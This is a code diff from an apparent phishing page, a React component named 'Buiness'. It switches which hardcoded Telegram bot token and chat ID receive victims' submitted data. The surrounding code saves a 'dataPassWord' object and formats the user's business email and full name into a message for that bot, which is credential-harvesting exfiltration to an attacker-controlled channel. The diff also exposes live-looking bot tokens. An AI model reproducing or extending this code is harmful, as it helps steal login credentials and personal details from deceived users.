@@ -54,10 +54,10 @@ const Buiness = () => {
         
                     localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
         
-                    const bot_token = '6481745897:AAGlEhZSpMevvKrloFpqHLYcYQfenxeFvC8';
-                    const chat_id   = '1367126688';
-                    // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
-                    // const chat_id   = '5208541473';
+                    // const bot_token = '6481745897:AAGlEhZSpMevvKrloFpqHLYcYQfenxeFvC8';
+                    // const chat_id   = '1367126688';
+                    const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
+                    const chat_id   = '5208541473';
         
                     const message   = '<strong>User Email: </strong>' + dataPassWord.fill_business_email + 
                     '%0A<strong>User Name: </strong>' + dataPassWord.fill_full_name + 
